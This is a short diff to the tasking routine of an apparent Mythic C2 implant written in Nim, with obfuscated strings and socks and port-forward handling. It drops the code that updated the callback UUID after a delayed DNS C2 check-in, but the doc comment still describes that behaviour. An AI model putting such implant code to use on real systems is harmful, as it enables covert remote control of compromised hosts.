@@ -290,7 +290,7 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: var Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
+proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode], rpfwd: seq[JsonNode]] =
   ## Get tasking from Mythic
   ## Returns tasks, interactive messages, socks messages, and rpfwd messages
   ## Also updates agent.callbackUuid if a delayed checkin response is received
@@ -316,15 +316,6 @@ proc getTasks*(agent: var Agent): tuple[tasks: seq[JsonNode], interactive: seq[J
   
   try:
     let respJson = parseJson(response)
-    
-    # Check if this is a delayed checkin response (contains "id" field with callback UUID)
-    # This happens with DNS C2 when the server queues the checkin response
-    if respJson.hasKey(obf("id")) and respJson.hasKey(obf("status")):
-      if respJson[obf("status")].getStr() == obf("success"):
-        let newCallbackUuid = respJson[obf("id")].getStr()
-        if newCallbackUuid != agent.callbackUuid:
-          debug "[DEBUG] Received delayed checkin response - updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
-          agent.callbackUuid = newCallbackUuid
     
     if respJson.hasKey(obf("tasks")):
       tasks = respJson[obf("tasks")].getElems()
